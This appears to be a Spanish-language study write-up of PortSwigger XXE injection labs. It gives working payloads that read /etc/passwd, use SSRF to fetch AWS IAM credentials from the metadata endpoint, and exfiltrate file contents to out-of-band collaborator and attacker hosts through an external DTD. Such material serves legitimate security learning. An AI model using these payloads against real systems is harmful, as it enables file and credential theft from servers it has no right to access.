# XXE Injection (XML external entity (XXE) injection)

## XML 

> XML significa lenguaje de marcado extensible. XML fue diseñado para almacenar y transportar datos. XML fue diseñado para ser legible tanto por humanos como por máquinas.

Para describir los datos de un XML se utilizan los "XML uses a DTD to describe the data" esto significa que un DTD define que datos van a ir y de que tipo son

Sintaxis basica:

```

<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>

``` 

## DTD What is document type definition?

> La definición de tipo de documento XML (DTD) contiene declaraciones que pueden definir la estructura de un documento XML, los tipos de valores de datos que puede contener y otros elementos. La DTD se declara dentro del DOCTYPEelemento opcional al comienzo del documento XML. La DTD puede ser completamente autónoma dentro del propio documento (conocido como "DTD interno") o puede cargarse desde otro lugar (conocido como "DTD externo") o puede ser un híbrido de los dos.


## XXE

A menudo, permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con cualquier sistema externo o de back-end al que pueda acceder la propia aplicación.

## What are XML entities

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

Ejemplo: 

```
<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>Tove</to>
  <from> &lt;Jani&gt; </from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>

```


En el ejemplo anterior las entidades &lt;y &gt;representan los caracteres <y >
  
> Las entidades XML son una forma de representar un elemento de datos dentro de un documento XML, en lugar de utilizar los datos en sí. Varias entidades están integradas en la especificación del lenguaje XML. Por ejemplo, las entidades &lt;y &gt;representan los caracteres <y >. Estos son metacaracteres que se utilizan para indicar etiquetas XML y, por lo tanto, generalmente deben representarse mediante sus entidades cuando aparecen dentro de los datos.

## Ataque 
  
  ***La DTD se declara dentro del DOCTYPEelemento opcional al comienzo del documento XML.*** XML permite definir entidades personalizadas dentro de la DTD. Por ejemplo:
  
  ```
  <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
  
Entonces esta el XML en el inico se declara(opcionalmente) un DTD y dentro este se declaran entidades(entidades internas o externas se pueden cargar de otro lugar o hibridas) (***Las entidades XML son una forma de representar un elemento de datos dentro de un documento XML***) ( Varias entidades están integradas en la especificación del lenguaje XML. Por ejemplo, las entidades &lt;y &gt;representan los caracteres <y >)
  
  ```

Esta definición significa que cualquier uso de la referencia a la entidad &myentity;dentro del documento XML se reemplazará con el valor definido: " my entity value".
  
 ##  Las entidades externas XML como Vector de Ataque
  
  
Ya sabemos que son formas de representar datos y que so ninternas y externas las externas se cargan desde otro lado y por eso permiten el ataque.
  
> Las entidades externas XML son un tipo de entidad personalizada cuya definición se encuentra fuera de la DTD donde se declaran.
La declaración de una entidad externa utiliza la SYSTEMpalabra clave y debe especificar una URL desde la que se debe cargar el valor de la entidad. Por ejemplo:  

```
  
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>  

```  
  
  
  
La URL puede usar el file://protocolo, por lo que las entidades externas se pueden cargar desde el archivo. Por ejemplo:  
  
```  
  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
  
```
  
# Exploiting XXE using external entities to retrieve files
  
  La mas basica de este ataque donde no hay protecciones.
  
  ```

<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>2</storeId>
</stockCheck>

  ```
El &xxe; llama a la entidad que definimos en el DTD
  
# Exploiting XXE to perform SSRF attacks
  
  Podemos mediante el xxe hacer que el servidor visite url a las que tiene acceso por ejemplo a las de la red interna o  algun endpoint.
  
  > Además de la recuperación de datos confidenciales, el otro impacto principal de los ataques XXE es que pueden usarse para realizar una falsificación de solicitudes del lado del servidor (SSRF). Esta es una vulnerabilidad potencialmente grave en la que se puede inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a cualquier URL a la que pueda acceder el servidor.
  
  Para este ataque nos damos cuenta que se envia un xml inyectamos en los parametros la entity y nos damos cuenta que en el primer elemento
  nos regresa una ruta asi se va sacando poco a poco informacion hasta que llegamos a obtener las claves el IAM de AWs
  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.168.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>
&xxe;</productId>
<storeId>
1
</storeId>
</stockCheck>
  
  ```
  
  Necesitariamos saber que esa IP tiene un endpoint que el servidor tiene acceso 
  
  
# Blind XXE with out-of-band interaction
  
  En este ejericio aunque se inyecte una entidad externa no regresa ningun cambio por lo cual probamos haciendo un ataque "vulnerabilidad al desencadenar interacciones fuera de banda con un dominio externo" usando el Burp Collaborator en donde lo que se inyecta intentara alcanzar el dominio que nos da el burp y por ahi podremos
exfiliar informacion.
  
  ```
  
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://ywycs7zj3x3yke65m5jfox94gvmlaa.oastify.com"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>

  ```
  
 EL burp colaborator permite ver los logs tanto del http como de DNS "Debería ver algunas interacciones DNS y HTTP iniciadas por la aplicación como resultado de su carga útil."
  
# Blind XXE with out-of-band interaction via XML parameter entities
  
  Para este laboratorio el XML no regresa ninguna respuesta es por eso que se intenta monitorear las peticiones dns y http con el burp colaborator tambien 
  introduce un nuevo concepto
  
  ##  XML parameter entities
  
  Es otra forma de declarar entidades dentro de un DTD de la siguiente manera:
  
  ```
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 

  ```
  Y cuando se quiere hacer referencia a esta en ves de usar el & usas el % por ejemplo
  
  ```
  %myparameterentity;
  
  ```
  Y para resolverlo hacemos uso de todo
  
  
  ``` 
  
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ehm31goawicaax221p33qigl7rxfm.oastify.com"> %xxe; ]>
<stockCheck><productId>
%xxe;
</productId><storeId>1</storeId></stockCheck>
  
  ```
  
  # Exploiting blind XXE to exfiltrate data using a malicious external DTD
  
  Para este ejercicio se va a tomar un DTD de un servidor externo. Primero se declara en el servidor que aloja el dtd malicioso
  
  ```
  <!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
  
  NOTA: El metodo alternativo es el que se llama eval y exfil directamente desde burp
  
  ```
  
  En la peticiond e burp:
  
 
  ```
<!DOCTYPE foo [<!ENTITY % loadDtd SYSTEM "https://exploit-0ad800db03236715c0af66bb013a0064.web-security-academy.net/exploit"> %loadDtd;
%eval;
%exfil;// eSTO ES PARTE DE LA SOLCION ALTERNA  EL PRIMER METODO SOLO LLEVARIA EL %loadDtd;
]>
  
  ```
  Revisamos en el burp colaborator y en la http reques se paso la solicion como query ?valor
  
***Referencias***

Validador de XML
  
> http://xmlvalidator.new-studio.org/
  
> https://portswigger.net/web-security/xxe/xml-entities
  
> https://www.xmlvalidation.com/
  
